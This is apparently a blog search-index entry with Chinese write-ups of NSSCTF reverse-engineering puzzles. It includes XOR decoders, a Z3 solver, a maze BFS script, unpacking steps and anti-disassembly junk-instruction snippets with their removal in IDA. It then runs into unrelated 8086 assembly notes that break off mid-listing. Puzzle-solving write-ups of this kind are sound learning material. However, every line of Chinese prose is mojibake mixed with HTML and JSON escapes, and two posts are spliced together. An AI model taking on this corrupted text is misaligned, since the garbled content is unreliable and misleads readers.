ä¸ºä¸æ»¡2ä¸ªå®½åº¦çš„å­—ç¬¦ä¸²å‰æ·»åŠ 0ç›´åˆ°å®½åº¦ä¸º2 easy C ç›´æ¥é€†å®Œäº‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main() { char b[] = \u0026#34;d`vxbQd\u0026#34;; for (int i = 0; i \u0026lt; 7; i++) { â€‹ b[i] = b[i] ^ 2; â€‹ b[i]--; } printf(\u0026#34;%s\\n\u0026#34;, b); } æœ‰ç‚¹å°éš¾çš„é€»è¾‘é¢˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 flag = \u0026#39;xxxxxxxxxxxxxxxxxxxxx\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; result = \u0026#39;\u0026#39; for i in range(len(flag)): s1 = ord(flag[2*i]) s2 = ord(flag[2*i+1]) result += s[(s1+i)%34]+s[-(s2+i+1)%34] print(result) \\# result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #çˆ†ç ´è„šæœ¬ï¼Œèœç‹—ä¸ä¼šé€†å‘ result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; flag = \u0026#39;\u0026#39; l=range(len(result)//2) #å…ˆæ‰¾åˆ°sä¸­çš„ç´¢å¼•å€¼ for i in l: indx1 = s.index(result[2*i]) indx2 = s.index(result[2*i+1]) for num in range(32,127): â€‹ s1 = num //17 â€‹ s2 = num % 17 â€‹ ds1 = (s1+i)%34 â€‹ ds2 = -(s2+i+1)%34 â€‹ if indx1 == ds1 and indx2 == ds2: â€‹ flag += chr(num) â€‹ break print(flag) æ€è·¯ï¼šå…¶å®ä»såˆ°resultä»åˆ†æå­¦æ¥çœ‹ï¼Œå°±æ˜¯ä¸€ä¸ªæ•°åˆ—é‡æ’ï¼Œflagè¢«ç”¨ä½œä¸€ä¸ªå¯¹åº”çš„å‡½æ•°å…³ç³»å¼ï¼Œåªè¦ä¸€ä¸€éªŒè¯resultå’Œsçš„å€¼åœ¨å“ªä¸ªåœ°æ–¹ç›¸ç­‰ï¼Œå°±å¯ä»¥æ±‚å‡ºflagï¼Œindex()å°±æ˜¯æ‰¾resultä¸­çš„å€¼åœ¨sçš„å“ªä¸ªä½ç½®ï¼Œè¿™ä¸ªindexå†ç»è¿‡é€†å‘/çˆ†ç ´ï¼Œå¯ä»¥å¾—åˆ°flag\nfakerandom random.seed()ï¼šé€šè¿‡è®¾ç½®ç›¸åŒçš„éšæœºç§å­ï¼Œå¯ä»¥ç¡®ä¿æ¯æ¬¡è¿è¡Œæ—¶è·å¾—ç›¸åŒçš„éšæœºæ•°åºåˆ—\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import random flag = \u0026#39;xxxxxxxxxxxxxxxxxxxx\u0026#39; random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) result=[] for i in range(len(l)): random.seed(l[i]) for n in range(5): â€‹ result.append(ord(flag[i*5+n])^random.getrandbits(8)) print(result) \\# result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import random result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] flag = [] random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) print(l) for i in range(len(l)): random.seed(l[i]) for n in range(5): â€‹ flag.append((chr((result[i*5+n])^random.getrandbits(8)))) flag = \u0026#39;\u0026#39;.join(flag) print(flag) å¡åœ¨ç­¾åˆ°é¢˜äº†\u0026hellip; if ( Str2[j] == 111 ) Str2[j] = 48; çœ‹åˆ°æœ‰ä¸ªå¾ˆåƒflagçš„{hello_world},æäº¤ç»“æœå‘ç°é”™äº†ï¼Œä¸€çœ‹ä¼ªä»£ç ï¼Œå‘ç°æŠŠ0æ”¹æˆäº†oï¼ŒASCIIè¡¨oå¯¹åº”111ï¼Œ0å¯¹åº”48\nèŠ±æŒ‡ä»¤ jump\n1 2 3 4 5 6 7 8 9 10 start://èŠ±æŒ‡ä»¤å¼€å§‹ jmp label1 DB junkcode label1: jmp label2 DB junkcode label2ï¼š jmp label3 DB junkcode label3 jnzå’Œjzè·³è½¬\n1 2 3 4 5 6 _asm{ jz label1 jnz label1 db junkcode label1: } æ°¸çœŸæ¡ä»¶è·³è½¬ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __asm{ push ebx xor ebx,ebx test ebx,ebx jnz label1 jz label2 label1: _emit junkcode label2: pop ebx//éœ€è¦æ¢å¤ebxå¯„å­˜å™¨ } __asm{ clc jnz label1: _emit junkcode label1: } call\u0026amp;retæ„é€ èŠ±æŒ‡ä»¤ 1 2 3 4 5 6 7 8 9 10 11 __asm{ call label1 _emit junkcode label1: add dword ptr ss:[esp],8//å…·ä½“å¢åŠ å¤šå°‘æ ¹æ®è°ƒè¯•æ¥ ret _emit junkcode } callæŒ‡ä»¤ï¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‹å…¥æ ˆï¼Œå†è·³è½¬æ‰§è¡Œ retæŒ‡ä»¤ï¼šå°†ä¿å­˜çš„åœ°å€å–å‡ºï¼Œè·³è½¬æ‰§è¡Œ ä¾‹é¢˜\næŒ‰Dè½¬æ¢æˆæ•°æ®å½¢å¼\nå³é”®change bytes E8æ¢æˆ90 å°±æ˜¯nop\nåé¢å˜é»„çš„åœ°å€cä¿®å¤å³å¯\nè½¬åˆ°å‡½æ•°å¼€å¤´pç”Ÿæˆå‡½æ•°\n[HUBUCTF 2022 æ–°ç”Ÿèµ›]ezPython æ‹¿åˆ°é¢˜ç›®ï¼Œå‘ç°æ–‡ä»¶æ—¶.pyzç»“å°¾ï¼Œå…ˆè½¬æ¢æˆpyæ ¼å¼\nuncompyle 6 -o ezPython.py ezPython.pyz\n1 2 3 4 5 6 7 8 9 10 from Crypto.Util.number import * import base64, base58 password = open(\u0026#34;password.txt\u0026#34;, \u0026#34;r\u0026#34;).read() tmp = bytes_to_long(password.encode(\u0026#34;utf-8\u0026#34;)) ans = base64.b64encode(base58.b58encode(str(tmp))).decode() print(\u0026#34;I\u0026#39;ve forgot my password,could you please help me find the password?\u0026#34;) if ans == \u0026#34;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==\u0026#34;: print(\u0026#34;You get the password!\u0026#34;) else: print(\u0026#34;Wrong! try again\u0026#34;) è§£é‡Šä¸‹ï¼Œbytes_to_long()æŠŠå­—èŠ‚è½¬æ¢æˆé•¿æ•´å‹ï¼ŒåŠ å¯†æˆutf-8å½¢å¼ï¼Œå†è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œè½¬ä¸ºbase58ï¼Œè½¬ä¸ºbase64ï¼Œé€†è¿‡æ¥å†™å°±è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 from Crypto.Util.number import * import base64 import base58 import hashlib flag1=\u0026#34;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==\u0026#34; flag= int(base58.b58decode(base64.b64decode(flag1))) print(flag) flag = long_to_bytes(flag) flag.decode(\u0026#34;utf-8\u0026#34;) flag = hashlib.md5(flag).hexdigest() print(flag) ä¸€äº›ä¹ æƒ¯ï¼šæ‰“å¼€IDAshift f12æŸ¥çœ‹å­—ç¬¦ä¸²\nctrl+x äº¤å‰å¼•ç”¨\nZ3-slover Solver()\nåˆ›å»ºä¸€ä¸ªæ±‚è§£å™¨ï¼Œåœ¨é‡Œé¢æ·»åŠ çº¦æŸæ¡ä»¶è¿›è¡Œä¸‹ä¸€æ­¥çš„æ±‚è§£\nadd()\né€šå¸¸åœ¨solver()å‘½ä»¤ä¹‹åï¼Œç”¨æ¥æ·»åŠ çº¦æŸæ¡ä»¶ï¼Œé€šå¸¸æ·»åŠ çš„çº¦æŸæ¡ä»¶æ˜¯ä¸€ä¸ªç­‰å¼\ncheck()\nåˆ¤æ–­æ˜¯å¦æ·»åŠ çš„çº¦æŸæ¡ä»¶æ˜¯å¦æœ‰è§£ï¼Œæœ‰è§£è¿”å›satï¼Œæ— è§£è¿”å›unsat\nmodel()\nåœ¨æœ‰è§£çš„æƒ…å†µä¸‹ï¼Œæ±‚è§£çš„äº¤é›†å†è¾“å‡ºåˆ›å»ºæ±‚è§£çº¦æŸå™¨\n1 solver = Solver æ·»åŠ çº¦æŸæ¡ä»¶\n1 solver.add() åˆ¤æ–­è§£æ˜¯å¦å­˜åœ¨\n1 if solver.check()==sat æ±‚è§£\n1 print solver.model() é¢˜ç›®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;iostream\u0026gt; using namespace std; void flag_checker(int v, int w,int x,int y,int z); int main(){ int v,w,x,y,z; cout \u0026lt;\u0026lt; \u0026#34;Input 5 random number and check your luck ;)\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Num1: \u0026#34;; cin \u0026gt;\u0026gt; v; cout \u0026lt;\u0026lt; \u0026#34;Num2: \u0026#34;; cin \u0026gt;\u0026gt; w; cout \u0026lt;\u0026lt; \u0026#34;Num3: \u0026#34;; cin \u0026gt;\u0026gt; x; cout \u0026lt;\u0026lt; \u0026#34;Num4: \u0026#34;; cin \u0026gt;\u0026gt; y; cout \u0026lt;\u0026lt; \u0026#34;Num5: \u0026#34;; cin \u0026gt;\u0026gt; z; cout \u0026lt;\u0026lt; endl; flag_checker(v,w,x,y,z); } void flag_checker(int v,int w, int x, int y, int z){ if ((v * 23 + w * -32 + x * 98 + y * 55 + z * 90 == 333322) \u0026amp;\u0026amp; (v * 123 + w * -322 + x * 68 + y * 67 + z * 32 == 707724) \u0026amp;\u0026amp; (v * 266 + w * -34 + x * 43 + y * 8 + z * 32 == 1272529) \u0026amp;\u0026amp; (v * 343 + w * -352 + x * 58 + y * 65 + z * 5 == 1672457) \u0026amp;\u0026amp; (v * 231 + w * -321 + x * 938 + y * 555 + z * 970 == 3372367)){ cout \u0026lt;\u0026lt; \u0026#34;Congratulations, Here is your flag:\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;flag{\u0026#34; \u0026lt;\u0026lt; v \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; w \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; y \u0026lt;\u0026lt; \u0026#34;_\u0026#34; \u0026lt;\u0026lt; z \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl; } else{ cout \u0026lt;\u0026lt; \u0026#34;\\nSeems your luck is not in favor right now!\\nBetter luck next time!\u0026#34; \u0026lt;\u0026lt; endl; } } 1 2 3 4 5 6 7 8 9 10 from z3 import * s=Solver() v,w,x,y,z=Ints(\u0026#39;v w x y z\u0026#39;) #å®šä¹‰æ•´æ•°å˜é‡ s.add(v * 23 + w * -32 + x * 98 + y * 55 + z * 90 == 333322) s.add(v * 123 + w * -322 + x * 68 + y * 67 + z * 32 == 707724) s.add(v * 266 + w * -34 + x * 43 + y * 8 + z * 32 == 1272529) s.add(v * 343 + w * -352 + x * 58 + y * 65 + z * 5 == 1672457) s.add(v * 231 + w * -321 + x * 938 + y * 555 + z * 970 == 3372367) s.check() print(s.model()) [SWPUCTF 2022 æ–°ç”Ÿèµ›]xor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;stdlib.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main() { char str[] = \u0026#34;LQQAVDyZMP]3q]emmf]uc{]vm]glap{rv]dnce\u0026#34;; char flag[39]; for (int i = 0; i \u0026lt;= 38; i++) { â€‹ flag[i] = str[i] ^ 2; } printf(\u0026#34;%s\u0026#34;, flag); } easyasm cmp [ebp+i], eax\njge short loc_40119D ï¼ˆå¤§äºç­‰äºï¼‰\næœ€ä¸»è¦æ˜¯è¿™ä¸¤è¡Œï¼Œä»¥åŠ[ebp+i]ä¸€å¼€å§‹èµ‹å€¼ä¸º0\neaxæ²¡æœ‰åˆå§‹åŒ–ï¼Œæˆ‘æƒ³ç¬¬ä¸€æ¬¡å¾ªç¯æ˜¯ä¸ä¼šç›´æ¥è·³ï¼Œæ‰€ä»¥ç»§ç»­æ‰§è¡Œåé¢çš„å†…å®¹ï¼Œçœ‹åˆ°xor eax, 33hï¼ŒçŸ¥é“å’Œ55ä½œå¼‚æˆ–è¿ç®—ï¼Œé€†è¿‡æ¥å°±æ˜¯æŠŠæ˜æ–‡æ¯ä¸ªä½œXORè¿ç®—\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ; void __cdecl enc(char *p) .text:00401160 _enc proc near ; CODE XREF: _main+1Bâ†‘p .text:00401160 .text:00401160 i = dword ptr -4 .text:00401160 Str = dword ptr 8 .text:00401160 .text:00401160 push ebb .text:00401161 mov ebp, esp .text:00401163 push ecx .text:00401164 mov [ebp+i], 0 .text:0040116B jmp short loc_401176 .text:0040116D ; --------------------------------------------------------------------------- .text:0040116D .text:0040116D loc_40116D: ; CODE XREF: _enc+3Bâ†“j .text:0040116D mov eax, [ebp+i] .text:00401170 add eax, 1 .text:00401173 mov [ebp+i], eax .text:00401176 .text:00401176 loc_401176: ; CODE XREF: _enc+Bâ†‘j .text:00401176 mov ecx, [ebp+Str] .text:00401179 push ecx ; Str .text:0040117A call _strlen .text:0040117F add esp, 4 .text:00401182 cmp [ebp+i], eax .text:00401185 jge short loc_40119D .text:00401187 mov edx, [ebp+Str] .text:0040118A add edx, [ebp+i] .text:0040118D movsx eax, byte ptr [edx] .text:00401190 xor eax, 33h .text:00401193 mov ecx, [ebp+Str] .text:00401196 add ecx, [ebp+i] .text:00401199 mov [ecx], al .text:0040119B jmp short loc_40116D .text:0040119D ; --------------------------------------------------------------------------- .text:0040119D .text:0040119D loc_40119D: ; CODE XREF: _enc+25â†‘j .text:0040119D mov esp, ebp .text:0040119F pop ebp .text:004011A0 retn .text:004011A0 _enc endp Input: your flag Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char flag1[] = {0x5b, 0x54, 0x52, 0x5e, 0x56, 0x48, 0x44, 0x56, 0x5f, 0x50, 0x3, 0x5e, 0x56, 0x6c, 0x47, 0x3, 0x6c, 0x41, 0x56, 0x6c, 0x44, 0x5c, 0x41, 0x2, 0x57, 0x12, 0x4e}; char flag[100] = {0}; for (int i = 0; i \u0026lt; strlen(flag1); i++) { flag[i] = flag1[i] ^ 51; } printf(\u0026#34;%s\\n\u0026#34;, flag); } ä½ çŸ¥é“ä»€ä¹ˆäº‹pythonå— 1 2 3 4 5 6 7 8 9 10 11 12 13 14 s = str(input(\u0026#34;please input your flag:\u0026#34;)) arr=[29, 0, 16, 23, 18, 61, 43, 41, 13, 28, 88, 94, 49, 110, 66, 44, 43, 28, 91, 108, 61, 7, 22, 7, 43, 51, 44, 46, 9, 18, 20, 6, 2, 24] if(len(s)!=35 or s[0]!=\u0026#39;N\u0026#39;): print(\u0026#34;error\u0026#34;) exit(0) for i in range(1,len(s)): if(ord(s[i-1])^ord(s[i])!=arr[i-1]): print(\u0026#34;error!\u0026#34;) exit(0) print(\u0026#34;right!\u0026#34;) 1 2 3 4 5 6 arr=[29, 0, 16, 23, 18, 61, 43, 41, 13, 28, 88, 94, 49, 110, 66, 44, 43, 28, 91, 108, 61, 7, 22, 7, 43, 51, 44, 46, 9, 18, 20, 6, 2, 24] s = [\u0026#39;\u0026#39;] * 35 s[0]=\u0026#39;N\u0026#39; for i in range(1,len(arr)+1): s[i]=chr(ord(s[i-1])^arr[i-1]) print(\u0026#34;\u0026#34;.join(s)) s=[\u0026rsquo;\u0026rsquo;]*35 åˆ†é…åˆå§‹ç©ºé—´\nord()è½¬æ¢æˆasciiç \nchr()è½¬æ¢æˆå­—ç¬¦\nprint(\u0026quot;\u0026quot;.join(s))æ‹¼æ¥\nå®‰å“é€†å‘ java -jar jadx-1.5.1-all.jar\næ–‡ä»¶æ‹–è¿›æ¥\næœç´¢å­—ç¬¦ä¸²â€˜NOâ€™\n1 2 3 4 5 6 7 8 9 10 11 12 13 text = \u0026#39;æ£¿æ£¢æ£¢æ£²æ£¥æ£·æ£Šæ£æ£æ£šæ£¨æ£¨æ£µæ£¢æ£Œ\u0026#39; key = 987654321 flag = \u0026#39;\u0026#39; for i in text: \\# å°†ç»“æœé™åˆ¶åœ¨æœ‰æ•ˆçš„ Unicode èŒƒå›´å†…ï¼Œé™åˆ¶åœ¨0-255èŒƒå›´å†… flag += chr((ord(i) ^ key) % 256) print(flag) æ³¨æ„é™åˆ¶å­—ç¬¦é•¿åº¦ï¼\nchicken_soup èŠ±æŒ‡ä»¤ E8æ”¹æˆ90 pç”Ÿæˆå‡½æ•°\n%cç›´æ¥è½¬ä¸ºASCIIç ï¼Œcè¯­è¨€è¿™ç‚¹æ¯”pythonå¥½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { unsigned char a1[] = {0xCD, 0x4D, 0x8C, 0x7D, 0xAD, 0x1E, 0xBE, 0x4A, 0x8A, 0x7D, 0xBC, 0x7C, 0xFC, 0x2E, 0x2A, 0x79, 0x9D, 0x6A, 0x1A, 0xCC, 0x3D, 0x4A, 0xF8, 0x3C, 0x79, 0x69, 0x39, 0xD9, 0xDD, 0x9D, 0xA9, 0x69, 0x4C, 0x8C, 0xDD, 0x59, 0xE9, 0xD7}; for (int i = 0; i \u0026lt; 38; i++) { a1[i] = (16 * a1[i]) | (a1[i] \u0026gt;\u0026gt; 4); } for (int j = 36; j \u0026gt; 0; j--) { a1[j] -= a1[j + 1]; } for (int i = 0; i \u0026lt; 38; i++) { printf(\u0026#34;%c\u0026#34;, a1[i]); } return 0; } å…³äº†IDAå¿˜è®°æˆªå›¾ï¼Œç´¢æ€§æ‹¿åˆ«äººwp\nè€é¼ èµ°è¿·å®« éš¾å´©ï¼ŒWindowsç¯å¢ƒæœ‰ç‚¹éš¾é…\nconda activate 2-27è¿›å…¥python3.6ç‰ˆæœ¬çš„condaç¯å¢ƒï¼Œè¿›å…¥Dç›˜ç›®å½•pyinstxtractor\npython pyinstxtractor.py é™„ä»¶.exe\nç”¨struct.pycä¿®å¤5.pycå¤´æ–‡ä»¶\nè¿›å…¥Dç›˜pydcdçš„build\npycdc.exe 5.pyc\nè„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 from collections import deque #è®¾ç½®äºŒç»´å››å‘è¿·å®«, å¦‚æœé¢˜ç›®æ˜¯å¤šä¸ªå°è¿·å®«é—®é¢˜, æ‹†åˆ†å¤šæ¬¡è°ƒç”¨è„šæœ¬è·å–è·¯å¾„å³å¯ (row, col) = (12, 12) (i, j) = (0, 0) maze = [ [ 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1], [ 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1], [ 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [ 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1], [ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1]] path_len = 0x7fffffff#å¦‚æœé¢˜ç›®æœªç»™å‡ºç»ˆç‚¹åæ ‡ï¼Œåˆ™ä¸€å®šä¼šæŒ‡å®šè·¯å¾„çš„é•¿åº¦ï¼Œåœ¨æ­¤å¤„ä¿®æ”¹è·¯å¾„é•¿åº¦ï¼Œå¦åˆ™è¯·ä¿ç•™path_lençš„æå¤§å€¼ #è¿›è¡ŒBFSå¯»æ‰¾è·¯å¾„ def bfs(start, end, barrier): directions = [(0, 1), (1, 0), (0, -1), (-1, 0)] # å®šä¹‰å››ä¸ªæ–¹å‘çš„ç§»åŠ¨ for i in range(len(maze)):#è·å–èµ·ç‚¹å’Œç»ˆç‚¹åœ¨åˆ—è¡¨ä¸­çš„ç´¢å¼• for j in range(len(maze[i])): if(maze[i][j] == start): start = (i, j) if(maze[i][j] == end): end = (i, j) #ä»¥ä¸‹å‡æ˜¯bfsç®—æ³•å¥—è·¯ queue = deque() queue.append((start, [start])) # (å½“å‰ä½ç½®, è·¯å¾„) visited = set() visited.add(start) while queue: position, path = queue.popleft() if position == end: return path elif len(path)==path_len: return path for d in directions: next_position = (position[0] + d[0], position[1] + d[1]) if 0 \u0026lt;= next_position[0] \u0026lt; len(maze) and 0 \u0026lt;= next_position[1] \u0026lt; len(maze[0]) and \\ maze[next_position[0]][next_position[1]] != barrier and next_position not in visited: queue.append((next_position, path + [next_position])) visited.add(next_position) return None #æ‰§è¡ŒBFSæœç´¢å¹¶æ‰“å°ç»“æœ if __name__ == \u0026#39;__main__\u0026#39;: maze[0][1] = \u0026#39;S\u0026#39; #å¦‚æœé¢˜ç›®ç»™äº†èµ·ç‚¹ç»ˆç‚¹çš„åæ ‡ï¼Œåœ¨è¿™é‡Œç›´æ¥ç»™èµ·ç‚¹å’Œç»ˆç‚¹æ·»åŠ ç‰¹å¾ maze[24][23] = \u0026#39;E\u0026#39; path = bfs(\u0026#39;S\u0026#39;, \u0026#39;E\u0026#39;, 1) #bfså‡½æ•°ä¼ å…¥å‚æ•°ä»£è¡¨èµ·ç‚¹ã€ç»ˆç‚¹ã€éšœç¢çš„ç‰¹å¾(è‹¥é¢˜ç›®ç»™å‡ºçš„æ•°æ®æ— ç‰¹å¾, æ‰‹åŠ¨æ·»åŠ ç‰¹å¾å³å¯, é€šå¸¸éšœç¢æ˜¯1ä¹Ÿæœ‰å¯èƒ½æ˜¯0æˆ–å…¶å®ƒå­—ç¬¦å¦‚\u0026#39;#\u0026#39;) print(\u0026#34;ç§»åŠ¨è·¯å¾„åæ ‡ï¼š\u0026#34;, path) print(\u0026#34;ç§»åŠ¨è·¯å¾„æ–¹ä½ï¼š{\u0026#34;, end=\u0026#39;\u0026#39;) for i in range(1 ,len(path)): x1, y1, x2, y2 = path[i - 1][0], path[i - 1][1], path[i][0], path[i][1] if(x1 \u0026gt; x2):#ä¸Š print(\u0026#34;w\u0026#34;, end=\u0026#39;\u0026#39;) elif(x1 \u0026lt; x2):#ä¸‹ print(\u0026#34;s\u0026#34;, end=\u0026#39;\u0026#39;) elif(y1 \u0026gt; y2):#å·¦ print(\u0026#34;a\u0026#34;, end=\u0026#39;\u0026#39;) elif(y1 \u0026lt; y2):#å³ print(\u0026#34;d\u0026#34;, end=\u0026#39;\u0026#39;) print(\u0026#39;}\u0026#39;) éšåmd5åŠ å¯†\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nssctf%E9%80%86%E5%90%91%E9%A2%98/","title":"nssctfé€†å‘é¢˜"},{"content":"ç¼–è¾‘ï¼švim/edit\nç¼–è¯‘ï¼šmasm\né“¾æ¥ï¼šlink\nå°†å†…å­˜2000:0ï¼Œ2000:1,2000:2,2000:3å•å…ƒä¸­çš„æ•°æ®é€å…¥al,bl,cl,dlä¸­\n1 2 3 4 5 6 7 mov ax,2000 mov ds,ax;æ®µåœ°å€2000hé€å…¥ds mov bx,0;åç§»åœ°å€0é€å…¥bx mov al,[bx];ds:bxå•å…ƒä¸­çš„æ•°æ®é€å…¥al 1 2 3 4 5 mov ax,2000 mov ds,ax;æ®µåœ°å€2000hé€å…¥ds mov al,ds:[0] æ¯”è¾ƒ 1 2 3 4 5 6 7 mov al,[0];å°†å¸¸é‡0é€å…¥alä¸­ mov al,ds:[0];(al)=((ds)*16+0) mov al,ds:[bx];(al)=((ds)*16+(bx)) mov al,ds:[bx];ä¸ä¸Šé¢ç›¸åŒ å¾ªç¯ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 assume cs:code code segment â€‹ mov ax,0ffffh â€‹ mov ds,ax;åˆå§‹åŒ–ds:bxæŒ‡å‘ffff:0 â€‹ mov bx,0;åˆå§‹åŒ–ç´¯åŠ å¯„å­˜å™¨dx,(dx)=0 â€‹ mov cx,12;åˆå§‹åŒ–å¾ªç¯è®¡æ•°å¯„å­˜å™¨ s: mov al,[bx] â€‹ mov ah,0 â€‹ add dx,ax;é—´æ¥å‘dxä¸­åŠ ä¸Š((ds)*16+(bx))çš„æ•°å€¼ â€‹ inc bx â€‹ loop s â€‹ mov ax,4c00h â€‹ int 21h code ends end å¤åˆ¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 